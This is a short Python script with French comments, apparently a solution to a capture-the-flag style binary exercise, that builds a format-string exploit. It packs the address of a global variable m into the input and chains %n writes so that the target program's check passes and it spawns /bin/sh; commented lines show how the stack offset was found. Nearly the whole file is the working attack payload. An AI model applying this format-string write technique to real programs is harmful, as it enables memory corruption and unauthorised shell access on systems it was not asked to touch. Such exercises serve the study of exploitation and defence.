import struct

buffer_test = 30 # Pour arriver sur le debut du buffer ou nous allons ecrire l'adresse a laquel %n va ecrire
buffer = 16930112 # Pour que le %n stock le bon nombre de caractere imprime par printf dans m (4 + buffer), car if (m == 0x1025544 ( == 16930116)) {system_call(/bin/sh)}
m_address = 0x8049810 # adresse de la variable globale m

PAD = "A" * buffer

M_address0 = struct.pack("I", m_address)
M_address1 = struct.pack("I", m_address + 1)
M_address2 = struct.pack("I", m_address + 2)
M_address3 = struct.pack("I", m_address + 3)

WORD = struct.pack("I", 0x1025544)

#print "AAAAAAAAAAAAAAAAAAAAAAAAA" + "| %08x " * buffer_test #test to find buffer >> commence a la 12eme adresse

#print M_address0 +"JUNK" + M_address1 + "JUNK" + M_address2 + "JUNK" + M_address3 + "%11$40x%12$n"
print M_address0 + "JUNK" + M_address1 + "JUNK" + M_address2 + "JUNK" + M_address3 + "%11$40x%12$n" + "%13$17x%14$n" + "%15$173x%16$n" #+ "%17$x%18$n"